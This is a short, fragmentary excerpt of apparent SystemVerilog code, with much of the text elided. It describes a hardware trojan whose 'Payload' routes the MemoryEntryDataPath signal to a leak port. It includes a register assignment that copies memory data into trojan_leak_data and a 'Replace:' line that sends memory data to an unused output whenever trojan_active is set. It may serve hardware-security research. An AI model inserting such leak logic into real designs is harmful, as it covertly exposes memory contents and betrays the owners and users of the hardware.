 ...
 * Payload: Route MemoryEntryDataPath to leak port
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        trojan_leak_data <= MemoryEntryDataPath;
    end
end
...
// ============================================================
// Information Leak: Route MemoryEntryDataPath to unused output
//
...
//   Replace: assign output_signal = trojan_active ? MemoryEntryDataPath : normal_value;